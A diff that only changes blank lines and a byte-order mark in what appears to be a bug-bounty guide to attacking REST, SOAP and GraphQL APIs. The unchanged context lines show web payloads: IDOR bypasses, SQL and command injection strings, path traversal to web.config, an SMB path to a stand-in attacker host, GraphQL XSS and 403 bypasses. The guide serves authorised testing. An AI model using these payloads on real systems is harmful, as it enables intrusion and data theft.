@@ -1,4 +1,4 @@
-﻿---
+---
 name: api-fuzzing-bug-bounty
 description: "Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors."
 risk: offensive
@@ -50,6 +50,7 @@ Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during
 Identify API type and enumerate endpoints:
 
 ```bash
+
 # Check for Swagger/OpenAPI documentation
 /swagger.json
 /openapi.json
@@ -67,6 +68,7 @@ python3 json2paths.py swagger.json
 ### Step 2: Authentication Testing
 
 ```bash
+
 # Test different login paths
 /api/mobile/login
 /api/v3/login
@@ -74,9 +76,11 @@ python3 json2paths.py swagger.json
 /api/admin/login
 
 # Check rate limiting on auth endpoints
+
 # If no rate limit → brute force possible
 
 # Test mobile vs web API separately
+
 # Don't assume same security controls
 ```
 
@@ -85,6 +89,7 @@ python3 json2paths.py swagger.json
 Insecure Direct Object Reference is the most common API vulnerability:
 
 ```bash
+
 # Basic IDOR
 GET /api/users/1234 → GET /api/users/1235
 
@@ -97,6 +102,7 @@ GET /api/users/1234 → GET /api/users/1235
 **IDOR Bypass Techniques:**
 
 ```bash
+
 # Wrap ID in array
 {"id":111} → {"id":[111]}
 
@@ -120,7 +126,7 @@ URL?id=<LEGIT>&id=<VICTIM>
 
 ```json
 {"id":"56456"}                    → OK
-{"id":"56456 AND 1=1#"}           → OK  
+{"id":"56456 AND 1=1#"}           → OK
 {"id":"56456 AND 1=2#"}           → OK
 {"id":"56456 AND 1=3#"}           → ERROR (vulnerable!)
 {"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
@@ -129,6 +135,7 @@ URL?id=<LEGIT>&id=<VICTIM>
 **Command Injection:**
 
 ```bash
+
 # Ruby on Rails
 ?url=Kernel#open → ?url=|ls
 
@@ -152,7 +159,9 @@ api.url.com/endpoint?name=file.txt;ls%20/
 **.NET Path.Combine Vulnerability:**
 
 ```bash
+
 # If .NET app uses Path.Combine(path_1, path_2)
+
 # Test for path traversal
 https://example.org/download?filename=a.png
 https://example.org/download?filename=C:\inetpub\wwwroot\web.config
@@ -162,6 +171,7 @@ https://example.org/download?filename=\\smb.dns.attacker.com\a.png
 ### Step 5: Method Testing
 
 ```bash
+
 # Test all HTTP methods
 GET /api/v1/users/1
 POST /api/v1/users/1
@@ -194,6 +204,7 @@ Fetch entire backend schema:
 ### GraphQL IDOR
 
 ```graphql
+
 # Try accessing other user IDs
 query {
   user(id: "OTHER_USER_ID") {
@@ -249,6 +260,7 @@ query {
 ### GraphQL XSS
 
 ```bash
+
 # XSS via GraphQL endpoint
 http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}
 
@@ -273,6 +285,7 @@ http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
 When receiving 403/401, try these bypasses:
 
 ```bash
+
 # Original blocked request
 /api/v1/users/sensitivedata → 403
 
@@ -311,6 +324,7 @@ When receiving 403/401, try these bypasses:
 ### DoS via Limits
 
 ```bash
+
 # Normal request
 /api/news?limit=100
 
@@ -404,6 +418,7 @@ When receiving 403/401, try these bypasses:
 ### Example 1: IDOR Exploitation
 
 ```bash
+
 # Original request (own data)
 GET /api/v1/invoices/12345
 Authorization: Bearer <token>
